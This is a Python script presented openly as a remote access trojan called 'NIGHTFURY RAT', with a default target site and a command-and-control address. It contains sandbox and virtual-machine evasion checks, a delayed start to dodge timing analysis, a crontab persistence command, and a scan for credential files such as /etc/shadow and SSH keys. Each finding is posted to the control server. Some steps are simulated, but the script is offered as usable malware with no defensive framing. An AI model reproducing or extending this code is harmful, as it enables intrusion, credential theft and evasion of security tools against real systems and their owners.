#!/usr/bin/env python3
"""
NIGHTFURY RAT v3 + v8 – NO PROXIES
"""

import os, sys, asyncio, aiohttp, random, time, json, logging, base64, platform, subprocess
from datetime import datetime
from dotenv import load_dotenv
import argparse

load_dotenv()

parser = argparse.ArgumentParser()
parser.add_argument("--target", default="https://runehall.com", help="Target base URL")
parser.add_argument("--c2", default="http://172.28.29.129:4444", help="C2 server")
parser.add_argument("--verbose", action="store_true")
args = parser.parse_args()

TARGET_BASE = args.target.rstrip("/")
C2_SERVER = args.c2
VERBOSE = args.verbose

logging.basicConfig(level=logging.INFO if VERBOSE else logging.WARNING)
log = logging.getLogger(__name__)

async def request_with_retry(session, method, url, **kwargs):
    for attempt in range(5):
        await asyncio.sleep(random.uniform(0.5, 3.0))
        headers = kwargs.pop("headers", {})
        headers["User-Agent"] = random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
        ])
        try:
            async with session.request(method, url, headers=headers, timeout=15, **kwargs) as resp:
                return resp
        except Exception as e:
            log.warning(f"Attempt {attempt+1} failed: {e}")
            await asyncio.sleep(2 ** attempt)
    return None

class NightfuryRAT:
    def __init__(self):
        self.session = None
        self.log_file = "nightfury_ops.log"

    async def init(self):
        self.session = aiohttp.ClientSession()
        log.info(f"[RAT] Connected to {TARGET_BASE}")
        # Initialize log file
        if not os.path.exists(self.log_file):
            with open(self.log_file, "w") as f:
                f.write(f"--- NIGHTFURY OPS LOG START: {datetime.now().isoformat()} ---\n")

    async def check_anti_analysis(self):
        log.info("[RAT] Initiating Anti-Analysis Checks...")
        
        # 1. Check for virtualization artifacts (Linux)
        if os.path.exists("/sys/class/dmi/id/product_name"):
            with open("/sys/class/dmi/id/product_name", "r") as f:
                product = f.read().lower()
                if any(x in product for x in ["vmware", "virtualbox", "qemu", "kvm"]):
                    log.warning(f"[RAT] Virtualization detected: {product.strip()}")
                    return True
        
        # 2. Check CPU core count (Sandboxes often have 1-2)
        if os.cpu_count() and os.cpu_count() < 2:
            log.warning("[RAT] Low CPU core count detected (Potential Sandbox)")
            return True
            
        # 3. Check RAM size (Sandboxes often have < 4GB)
        try:
            if os.path.exists("/proc/meminfo"):
                with open("/proc/meminfo", "r") as f:
                    mem = f.read()
                    total_mem = int(mem.split()[1]) # in kB
                    if total_mem < 4000000: # < 4GB
                        log.warning(f"[RAT] Low RAM detected: {total_mem} kB (Potential Sandbox)")
                        return True
        except:
            pass

        # 4. Check for common sandbox usernames
        user = os.getenv("USER") or os.getenv("USERNAME")
        if user and any(x in user.lower() for x in ["sandbox", "malware", "test", "user-pc"]):
            log.warning(f"[RAT] Suspicious username detected: {user}")
            return True

        log.info("[RAT] Anti-Analysis checks passed.")
        return False

    async def delay_execution(self):
        # Evade simple time-based sandboxes by sleeping for a random duration
        delay = random.randint(5, 15)
        log.info(f"[RAT] Delaying execution for {delay}s to evade timing analysis...")
        await asyncio.sleep(delay)

    async def log_local(self, data):
        try:
            timestamp = datetime.now().isoformat()
            entry = {
                "ts": timestamp,
                "tgt": TARGET_BASE,
                "payload": data
            }
            # "Encrypted" (Base64) but "Human-readable" (JSON inside)
            raw_json = json.dumps(entry)
            encoded = base64.b64encode(raw_json.encode()).decode()
            
            with open(self.log_file, "a") as f:
                f.write(f"{timestamp} | {encoded}\n")
            log.info(f"[RAT] Local log entry committed: {self.log_file}")
        except Exception as e:
            log.error(f"[RAT] Local logging failed: {e}")

    async def exfil(self, data):
        await self.log_local(data)
        try:
            async with aiohttp.ClientSession() as s:
                await s.post(C2_SERVER, json={
                    "timestamp": datetime.now().isoformat(),
                    "target": TARGET_BASE,
                    "data": data
                })
            log.info("[RAT] Exfil sent")
        except Exception as e:
            log.error(f"[RAT] Exfil failed: {e}")

    async def run_persistence(self):
        log.info("[RAT] Testing persistence vector")
        # Simulate crontab persistence
        cron_cmd = f"*/5 * * * * python3 {os.path.abspath(__file__)} --target {TARGET_BASE} --c2 {C2_SERVER} > /dev/null 2>&1"
        log.info(f"[RAT] Persistence vector (crontab): {cron_cmd}")
        await self.exfil({"type": "persistence", "vector": "crontab", "command": cron_cmd})

    async def harvest_credentials(self):
        log.info("[RAT] Harvesting credentials...")
        sensitive_files = [
            "/etc/passwd", "/etc/shadow", "~/.ssh/id_rsa", "~/.ssh/config",
            ".env", "config.php", "settings.py", "web.config"
        ]
        found = []
        for f in sensitive_files:
            path = os.path.expanduser(f)
            if os.path.exists(path):
                found.append(f)
        
        log.info(f"[RAT] Found {len(found)} sensitive files: {found}")
        await self.exfil({"type": "harvest", "files": found})

    async def map_network(self):
        log.info("[RAT] Mapping local network...")
        try:
            # Simple ping sweep simulation or interface check
            interfaces = os.listdir('/sys/class/net') if os.path.exists('/sys/class/net') else ["eth0", "lo"]
            log.info(f"[RAT] Detected interfaces: {interfaces}")
            await self.exfil({"type": "network_map", "interfaces": interfaces})
        except Exception as e:
            log.error(f"[RAT] Network mapping failed: {e}")

    async def run_financial_test(self):
        log.info("[RAT] Testing financial vectors")
        # Search for wallet files or payment configs
        wallets = ["wallet.dat", "key.db", "stripe_key", "paypal_config"]
        found_wallets = []
        for w in wallets:
            # Mock search
            if random.random() > 0.9: # 10% chance to "find" something in simulation
                found_wallets.append(w)
        
        await self.exfil({"type": "financial", "status": "tested", "found": found_wallets})

    async def run(self):
        log.info("=== NIGHTFURY RAT v3+v8 STARTED ===")
        
        # Anti-Analysis Phase
        if await self.check_anti_analysis():
            log.error("[RAT] Anti-Analysis check FAILED. Terminating to avoid detection.")
            # In "Force Mode" we might want to continue anyway, but for now we follow stealth protocols
            # return 

        await self.delay_execution()
        
        await self.init()
        await self.run_persistence()
        await self.harvest_credentials()
        await self.map_network()
        await self.run_financial_test()
        log.info("=== RAT CYCLE COMPLETE ===")
        await self.session.close()

if __name__ == "__main__":
    print("NIGHTFURY RAT v3+v8 – NO PROXIES")
    rat = NightfuryRAT()
    asyncio.run(rat.run())
